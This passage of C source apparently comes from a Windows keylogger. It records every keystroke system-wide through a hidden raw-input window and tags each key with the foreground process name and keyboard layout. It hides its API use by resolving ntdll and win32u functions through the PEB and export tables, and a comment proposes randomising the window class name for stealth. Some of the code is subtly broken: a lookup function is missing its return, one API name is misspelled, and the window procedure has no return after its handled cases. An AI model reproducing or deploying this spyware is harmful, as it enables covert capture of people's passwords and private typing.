    } while (Process32Next(snapShot, &Pe32));
}
int HKLtoKLID(HKL HKbLayout, OUT wchar_t KLID[KL_NAMELENGTH])
{
    RtlZeroMemory(KLID, KL_NAMELENGTH);
    WORD device = HIWORD(HKbLayout);

    if ((device & 0xf000) == 0xf000)
    {
        WORD layoutID = device & 0x0fff;
        HKEY key = { 0 };
        if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts", &key) != ERROR_SUCCESS)
            return -1;

        DWORD index = 0;
        wchar_t buffer[KL_NAMELENGTH];
        DWORD len = (DWORD)NumOfElements(buffer);

        while (RegEnumKeyExW(key, index, buffer, &len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
        {
            wchar_t layoutIdBuffer[MAX_PATH] = {};
            DWORD layoutIdBufferSize = sizeof(layoutIdBuffer);
            if (RegGetValueW(key, buffer, L"Layout Id", RRF_RT_REG_SZ, NULL, layoutIdBuffer, &layoutIdBufferSize) == ERROR_SUCCESS)
            {
                if (layoutID == wcstoul(layoutIdBuffer, NULL, 16)) // cross check if this function works correctly with github code
                {
                    _wcsupr(buffer);
                    wcscpy( KLID, buffer);
                    return 0;
                }
            }
            len = (DWORD)NumOfElements(buffer);
            ++index;
        }
        RegCloseKey(key);
    }
    else
    {
        if (device == 0)
            device = LOWORD(HKbLayout);
        swprintf(KLID, KL_NAMELENGTH, L"%08X", device);
        return 0;
    }
    return -1;
}
klg_ctx_t get_context(void)
{
    static klg_ctx_t ctx = { 0 };
    static DWORD ifCalled = 0;
   
    if (!ifCalled)
        ifCalled = GetTickCount64(); // #define _WIN32_WINNT 0x0600 for an application that uses this function

    ctx.time = GetTickCount64() - ifCalled;
    ctx.hwnd = GetForegroundWindow();
    DWORD thid = GetWindowThreadProcessId(ctx.hwnd, NULL);
    HANDLE th = OpenThread(THREAD_QUERY_INFORMATION, FALSE, thid);
    ctx.pid = GetProcessIdOfThread(th);

    ProcessName(ctx.pid, ctx.procname, sizeof(ctx.procname));

    if (!_wcsicmp(ctx.procname, L"cmd.exe"))
        thid = 0;

    ctx.hkl = GetKeyboardLayout(thid);
    CloseHandle(th);

    if (HKLtoKLID(ctx.hkl, ctx.klid) < 0)
        fprintf(stderr, "bad layout :/\n");

    return ctx;
}

void process_kbd_event(int vsc, int keyup, int vk)
{
	klg_ctx_t ctx = get_context();

    fprintf(stdout, "{ \"time\": %d, \"procname\": %ws, \"klid\": \"%ws\", \"keyup\": %d, \"sc\": %d, \"vk\": %d, \"vkn\": \"%s\" }\n",
        ctx.time,
        ctx.procname,
        // ctx.pid,
        // ctx.layout,
        // *(UINT*)&ctx.hkl,
        ctx.klid,
        // *(UINT*)&ctx.hkl,
        keyup ? 1 : 0,
        vsc,
        vk,
        ResolveVirtualKey(vk)
    );
}
LRESULT __stdcall WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_INPUT:
	{
		char Buf[64] = { 0 };
		UINT Buf_size = sizeof(Buf);

		if (importz.NtUserGetRawInputData((HRAWINPUT)lParam, RID_INPUT, Buf, &Buf_size, sizeof(RAWINPUTHEADER)))
		{
			RAWINPUT* raw = (RAWINPUT*)Buf;
			if (raw->header.dwType == RIM_TYPEKEYBOARD)
			{
				RAWKEYBOARD* RawKeyBoard = &raw->data.keyboard;
				process_kbd_event(RawKeyBoard->MakeCode, RawKeyBoard->Flags & RI_KEY_BREAK, RawKeyBoard->VKey);
			}
		}
		break; 
        
	}
	case WM_DESTROY:
	{
		PostQuitMessage(0);
		break; //cross check if the flow implemented in cap_rid.c (github) maps with this. Keylogger.cpp uses return 0 instead of the two lines
	}
	default:
	{
		return DefWindowProc(hWnd, msg, wParam, lParam);
	}
	}
}

VOID GetNtdllModule(PEB* peb, PLDR_MODULE* pLoadModule)
{
	PLIST_ENTRY Link;
	Link = peb->LoaderData->InMemoryOrderModuleList.Flink;
	while (true)
	{
		*pLoadModule = (PLDR_MODULE)((PBYTE)Link - 0x10);
		if (wcscmp((*pLoadModule)->FullDllName.Buffer, L"C:\\windows\\SYSTEM32\\ntdll.dll") == 0)
			break;
		Link = Link->Flink;
	}
	return;
}
VOID GetWin32uModule(PEB* peb, PLDR_MODULE* pLoadModule)
{
	PLIST_ENTRY Link;
	Link = peb->LoaderData->InMemoryOrderModuleList.Flink;
	while (true)
	{
		*pLoadModule = (PLDR_MODULE)((PBYTE)Link - 0x10);
		if (wcscmp((*pLoadModule)->FullDllName.Buffer, L"C:\\windows\\SYSTEM32\\win32u.dll") == 0)
			break;
		Link = Link->Flink;
	}
	return;
}
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory)
{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS pImageNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)pImageDosHeader + pImageDosHeader->e_lfanew);
	if (pImageNtHeader->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeader->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}
PVOID GetFunction(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, const CHAR* Function)
{
	PDWORD addressOfFuncs = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD addressOfOrdinals = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++)
	{
		PCHAR pFunctionName = (PCHAR)((PBYTE)pModuleBase + addressOfNames[cx]);
		PVOID pFuncaddress = (PVOID)((PBYTE)pModuleBase + addressOfFuncs[addressOfOrdinals[cx]]);

		if (strcmp(pFunctionName, Function) == 0)
		{
			return pFuncaddress;
		}
	}
}
BOOL LoadNtdllFunctions(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory)
{
	importz.LdrLoadDll = (LDRLOADDLL)GetFunction(pModuleBase, pImageExportDirectory, "LdrLoadDll");
	importz.RtlAllocateHeap = (RTLALLOCATEHEAP)GetFunction(pModuleBase, pImageExportDirectory, "RtlAllocateHeap");
	importz.RtlFreeHeap = (RTLFREEHEAP)GetFunction(pModuleBase, pImageExportDirectory, "RtlFreeHeap");
	importz.NtClose = (NTCLOSE)GetFunction(pModuleBase, pImageExportDirectory, "NtClose");
	importz.RtlDosPathNameToNtPathName_U = (RTLDOSPATHNAMETONTPATHNAME_U)GetFunction(pModuleBase, pImageExportDirectory, "RtlDosPathNameToNTPathName_U");
	importz.NtCreateFile = (NTCREATEFILE)GetFunction(pModuleBase, pImageExportDirectory, "NtCreateFile");
	importz.NtdllDefWindowProc_W = (NTDLLDEFWINDOWPROC_W)GetFunction(pModuleBase, pImageExportDirectory, "NtdllDefWindowProc_W");
	importz.NtQueryInformationFile = (NTQUERYINFORMATIONFILE)GetFunction(pModuleBase, pImageExportDirectory, "NtQueryInformationFile");
	importz.NtSetInformationFile = (NTSETINFORMATIONFILE)GetFunction(pModuleBase, pImageExportDirectory, "NtSetInformationFile");
	importz.NtWriteFile = (NTWRITEFILE)GetFunction(pModuleBase, pImageExportDirectory, "NtWriteFile");

	if (!importz.LdrLoadDll || !importz.RtlAllocateHeap || !importz.RtlFreeHeap || !importz.NtClose)
		return FALSE;

	if (!importz.RtlDosPathNameToNtPathName_U || !importz.NtCreateFile || !importz.NtdllDefWindowProc_W)
		return FALSE;

	if (!importz.NtQueryInformationFile || !importz.NtSetInformationFile || !importz.NtWriteFile)
		return FALSE;

	return TRUE;

}

SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;
	for (String2 = String; *String2; ++String2);
	return (String2 - String);
}
VOID CopyUnicodeStr(PUNICODE_STRING DestinationString, PCWSTR SourceString)
{
	SIZE_T DestSize;
	if (SourceString)
	{
		DestSize = StringLengthW(SourceString) * sizeof(WCHAR);
		DestinationString->Length = (USHORT)DestSize;
		DestinationString->MaximumLength = (USHORT)DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWCHAR)SourceString;
}
BOOL LoadWin32uFunctions()
{
	NTSTATUS Status = NULL;
	UNICODE_STRING Win32u = { 0 };
	CopyUnicodeStr(&Win32u, L"Win32u.dll");
	Status = importz.LdrLoadDll(NULL, 0, &Win32u, (PHANDLE)&importz.Win32uBA);
	if (!NT_SUCCESS(Status))
		return FALSE;

	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;

	if (!GetImageExportDirectory(importz.Win32uBA, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 3;

	importz.NtUserCallOneParam = (NTUSERCALLONEPARAM)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserCallOneParam");
	importz.NtUserDestroyWindow = (NTUSERDESTROYWINDOW)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserDestroyWindow");
	importz.NtUserRegisterRawInputDevices = (NTUSERREGISTERRAWINPUTDEVICES)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserRegisterRawInputDevices");
	importz.NtUserGetRawInputData = (NTUSERGETRAWINPUTDATA)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserGetRawInputData");
	importz.NtUserGetKeyboardState = (NTUSERGETKEYBOARDSTATE)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserGetKeyboardState");
	importz.NtUserToUnicodeEx = (NTUSERTOUNICODEEX)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserToUnicodeEx");
	importz.NtUserMapVirtualKeyEx = (NTUSERMAPVIRTUALKEYEX)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserMapVirtualKeyEx");
	importz.NtUserGetKeyNameText = (NTUSERGETKEYNAMETEXT)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserGEtKEyNameText");
	importz.NtUserGetMessage = (NTUSERGETMESSAGE)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserGetMessage");
	importz.NtUserTranslateMessage = (NTUSERTRANSLATEMESSAGE)GetFunction(importz.Win32uBA, pImageExportDirectory, "NtUserTranslateMessage");

	if (!importz.NtUserCallOneParam || !importz.NtUserDestroyWindow || !importz.NtUserRegisterRawInputDevices || !importz.NtUserGetRawInputData)
		return FALSE;

	if (!importz.NtUserGetKeyboardState || !importz.NtUserToUnicodeEx || !importz.NtUserMapVirtualKeyEx || !importz.NtUserGetKeyNameText)
		return FALSE;

	if (!importz.NtUserGetMessage || !importz.NtUserTranslateMessage)
		return FALSE;

	return TRUE;

}
INT WINAPI wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR lpCmdLine,
	_In_ INT nShowCmd)
{
	PPEB pCurrentPeb = (PPEB)__readgsqword(0x60);
	PLDR_MODULE ntdllModule = NULL;
	GetNtdllModule(pCurrentPeb, &ntdllModule);
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(ntdllModule->BaseAddress, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return 3;

	if (!(LoadNtdllFunctions(ntdllModule->BaseAddress, pImageExportDirectory)))
		return 1;

	if (!(LoadWin32uFunctions()))
		return 1;

	WNDCLASSEXW wc;
	ZeroMemory(&wc, sizeof(WNDCLASSEXW));
	wc.cbSize = sizeof(WNDCLASSEXW);
	wc.lpfnWndProc = WndProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = L"rawkbd_wndclass"; // replace class name with prng string

	if (!RegisterClassExW(&wc))
		return -1;
	// create window
HWND RawKb_wnd = CreateWindowExW(0, wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, GetModuleHandle(NULL), NULL);
	if (!RawKb_wnd)
		return -2;

	RAWINPUTDEVICE devs = { 0x01 /* generic */, 0x06 /* keyboard */, RIDEV_INPUTSINK, RawKb_wnd };
	if (importz.NtUserRegisterRawInputDevices(&devs, 1, sizeof(RAWINPUTDEVICE)) == FALSE)
		return -3;

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//some cleanup
	importz.NtUserDestroyWindow(RawKb_wnd);
	UnregisterClass(L"rawkbd_wndclass", GetModuleHandle(NULL));

	return 0;
}